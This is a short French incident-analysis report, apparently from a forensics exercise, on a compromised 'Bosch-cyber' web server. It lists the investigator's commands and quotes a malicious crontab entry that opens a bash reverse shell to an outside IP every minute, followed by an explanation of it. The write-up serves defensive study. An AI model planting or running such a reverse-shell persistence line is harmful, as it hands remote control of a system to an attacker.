# Rapport d'analyse

### Introduction

Le site web ==Bosch-cyber== a été attaqué. l'attaquant aurait récupéré des outils secrets très dangereux. Heureusement l'administration a mis le site eb maintenance. 

###### Notre mission : déterminer ce qui a été exfiltré par l'attaquant.

### Méthodologie



dans la commande history on voit qu'il y a un fichier .zip qui a été protégé par un mot de passe "bosch_cyber_tools.zip"
ce mot de passe peut etre lu depuis "/tmp/mypassword"

>unzip bosch_cyber_tools.zip 

demande un mot de passe

> cat /etc/hosts
> 
172.18.0.2

>cat /var/www/html/index.html

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Maintenance Bosch-Cyber</title>
</head>
<body>
    <p>Sorry for the inconvenience. We'e performing some issues at the moment. We'll be back up shortly!</p>
</body>
</html>
```


>cat .cache/
cat .bash_history 
cat .bash_logout 
cat .bashrc 
cat .profile 
cat .viminfo 
cat .cache/

rien

>cat crontab

*/1 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'

tache planifiée :
Il s'agit d'une tâche planifiée appelée Cron job, qui est exécutée sur un système Unix.

Le Cron job est configuré pour s'exécuter toutes les minutes (*/1 * * * *). Il exécute la commande /bin/bash -c '/bin/bash -i >& /dev/tcp/138.66.89.12/4444 0>&1'.

Cette commande ouvre un shell Bash et redirige son entrée/sortie vers un socket réseau. Plus précisément, elle envoie toute la sortie standard au socket réseau à l'adresse IP 138.66.89.12 et au numéro de port 4444, et elle envoie toute l'entrée standard depuis le socket réseau vers le shell Bash.

Ceci semble être une tentative de créer un shell inversé vers une machine distante à l'adresse IP et au numéro de port spécifiés. Il est important de noter que de telles actions peuvent être illégales et potentiellement nocives. Il est recommandé de enquêter et de remédier à de telles activités sur un système.

>cat access.log | grep "138.66.89.12"

résultat en image
